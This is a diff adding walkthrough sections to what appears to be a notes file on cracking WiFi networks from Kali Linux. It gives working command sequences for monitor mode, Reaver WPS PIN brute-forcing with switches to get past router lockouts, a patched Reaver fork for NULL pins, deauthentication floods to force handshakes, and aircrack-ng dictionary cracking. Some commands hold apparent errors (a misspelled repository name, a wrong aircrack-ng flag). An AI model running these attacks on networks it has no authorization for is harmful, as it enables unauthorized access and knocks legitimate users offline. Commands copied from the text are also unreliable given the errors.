@@ -266,3 +266,144 @@ Specific hash type:
        3721 = WebEdition CMS
        7600 = Redmine Project Management Web App
 ```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Packet monitoring and injection mode
+Once we started KALI on VituralBox, the first thing we did was to map the 2200mW NextG USB-Yagi TurboTenna as the USB Device by selecting "Ralink 802.11 n WLAN [0101]"
+On the command line terminal, we entered the commands below.
+Check the presence of the 2200mW NextG USB-Yagi TurboTenna (wlan0):
+```
+ifconfig -a
+```
+Packet monitoring and injection commands:
+```
+airmon-ng check kill
+
+airmon-ng check
+
+airmon-ng start wlan0
+
+airodump-ng wlan0mon
+```
+
+# REAVER - WPS Pin Attack
+
+WiFi Protected Setup (WPS) is a convenient feature that allows the user to configure a client device against a wireless network by simultaneously pressing a button on both the WiFi router and the client device (the client side “button” is often in software) at the same time. The devices exchange information, and then set up a secure WPA link.
+
+Reaver was designed to brute-force the WPA handshaking process remotely, even if the physical WPS button hadn’t been pressed on the WiFi router.
+
+While some newer devices are building in protection against this specific attack, the Reaver WPS exploit remains useful on many networks in the field.
+
+In particular, WPS is the vulnerable system in this case, not WPA. If a network has WPS disabled (which they should, given the existence of tools such as this), it will be immune to the following attack.
+
+To generate a list of WiFi networks that shows the status of WPS Locked:
+```
+wash -i wlan0mon
+```
+The “WPS Locked” column in the list is far from a definitive indicator, but those WPS Unlocked WiFi networks are much more susceptible to brute forcing.
+
+To launch Reaver against WiFi network with <BSSID> 11:22:33:44:55:66 :
+```
+reaver -i wlan0mon -b 11:22:33:44:55:66 -vv -K 1
+```
+It may take several hours and perhaps even longer to run because better designed WiFi router are getting smarter in terms of rejecting repeated attacks, longer and irregular timeout periods, illogical checksum and NULL pin.
+
+Ideally, the above command works and the attack progresses as expected. But in reality, manufacturers implement smarter protections against Reaver-style attacks, and additional options may be required to get the attack moving.
+
+As a countermeasure, a few optional switches can be added to get Reaver working on more picky devices:
+```
+reaver -i wlan0mon -c 11 -b 11:22:33:44:55:66 -vv -L -N -d 10 -T .5 -r 4:20
+```
+where
+
+-c 11is channel 11
+
+-L ignores locked WPS state
+
+-N Don't send NACK packets when errors are detected
+
+-d 10 Delay 10 seconds between PIN attempts
+
+-T .5 sets timeout period to half a second
+
+-r 4:20 after 4 attempts, sleep for 20 seconds
+
+Simply type reaver if you to look for more options to experiment:
+
+reaver
+
+Reaver is armed with a pin "12345670" that appears not changing but in fact it is the starting point followed by subsequent variations to attack the router. Knowing that it is only a matter of time to strike a successful hit, clever designers put a NULL pin for which the traditional Reaver programmer had never expected. A patched version of reaver-wps-fork-t6x emerged in 2017 in the light of combating the NULL pin.
+
+Installation was pretty straight forward on a newly created Reaver diractory:
+```
+mkdir reaver
+
+cd reaver
+
+git clone https://github.com/t6x/reaver-wps-furk-t6x.git
+
+apt-get install -y libpcap-dev
+
+cd src
+
+./configure
+
+make && make install
+```
+The -p option becomes available to foster a NULL pin or a digit sequence of various lengths.
+
+NULL pin:
+```
+reaver -i wlan0mon -b 11:22:33:44:55:66 -vv -K 1 -p ""
+```
+Pin with a length of 4 digits:
+```
+reaver -i wlan0mon -b 11:22:33:44:55:66 -vv -K 1 -p "4321"
+```
+
+
+# Brute-Force Dictionary Attack
+
+Next we moved on to the Brute-Force toolkit.
+
+While Reaver kept bombarding WiFi router with continuous retries, Brute-Force captured successful client handshakes from which a LOCK was crafted to be opened by the keys in a dictionary until a match was found. Rather than meddling with the router like forever, the brief encounter ended by a handshake that transcended into a much longer journey of lonely data processing.
+
+The dictionay such as rockyou.txt was a text file that contained commonly-used passwords or combinations of letters and numbers. A good dictionary thus needed to have "ALL" combinations imaginable. Ours contained 144344394 passwords that was a huge list. So an attack of this nature was time consuming. Success was based on computing power and the number of combinations tried rather than an ingenious algorithm.
+
+Having put the 2200mW NextG USB-Yagi TurboTenna into the packet monitoring and injection mode, we opened two command line terminals. One for capturing the handshake data and the other kept provoking for client handshakes.
+
+To launch Brute-Force against WiFi network with <BSSID> 11:22:33:44:55:66 and <ESSID> MyWiFi at channel 2:
+```
+airodump-ng -c 2 11:22:33:44:55:66 -w /root/Desktop/MyWiFi wlan0mon
+```
+To provoke client handshakes:
+```
+aireplay-ng -0 0 -a 11:22:33:44:55:66 wlan0mon
+```
+These processes were stopped once a successful handshake was found. KALI Linux has a dictionary residing in /usr/share/wordlists/rockyou.txt.gz
+
+To make sure that we had the latest update and installed the dictionary on Desktop:
+```
+apt-get update && apt-get full-upgrade
+
+cd Desktop
+
+gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+To try opening MyWiFi-01.cap with keys in the dictionary rockyou.txt:
+```
+aircrack-ng -1 rockyou.txt MyWiFi-01.cap
+```
